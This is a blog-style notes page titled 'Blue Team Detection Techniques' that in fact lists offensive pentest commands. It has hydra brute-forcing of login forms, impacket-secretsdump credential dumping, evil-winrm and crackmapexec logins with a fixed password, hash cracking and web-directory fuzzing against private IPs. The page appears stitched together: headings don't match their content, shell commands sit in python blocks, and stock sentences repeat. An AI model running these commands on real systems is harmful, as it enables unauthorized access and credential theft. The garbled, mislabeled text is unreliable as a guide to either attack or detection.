---
TitleSEO: "Blue Team Detection Techniques | ZureFX"
TitlePost: "Blue Team Detection Techniques"
Author: "ZureFX"
Description: "Personal notes on Blue Team Detection Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "linux, windows, dfir, oscp"
URL: "https://zurefx.github.io/notes/note-blue-team-detection-techniques-578.html"
URL_IMAGES: ""
Date: "2025-02-23"
Tags: "Linux, Windows, DFIR, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-blue-team-detection-techniques-578"
Permalink: "/notes/note-blue-team-detection-techniques-578.html"
BtnLabel: "Read Notes"
Pick: 0
---
## impacket

### Pass the Hash

> **Note:** SeDebugPrivilege was identified as the primary attack vector in this scenario.

```bash
evil-winrm -i 10.79.166.102 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.55.201.135 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## MongoDB

### FTP

- `bloodhound`
- `kerbrute`
- `Weak Service Permissions`
- `AS-REP Roasting`
- `rubeus`

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.86.77
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.100.210.25 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.15.227 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.85.125.104
```

```bash
nmap -sCV -p5986,995,1433 10.73.146.124 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
evil-winrm -i 10.82.227.209 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.26.147.3
```

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

## MySQL

### Sudo Misconfiguration

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.58.164.46/FUZZ
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.86.239.234 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.97.137.226/FUZZ
```

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.73.202.140/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.65.74.156/FUZZ
```

## .NET

### hydra

The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

- `burpsuite`
- `nmap`
- `smbclient`
- `ligolo-ng`

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.30.132.192 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.26.201.197/FUZZ
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.37.200.51 -u administrator -p 'P@ssw0rd!'
```

## evil-winrm

### Unquoted Service Path

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
gobuster dir -u http://10.125.76.253/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.42.143.3/FUZZ
```

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).
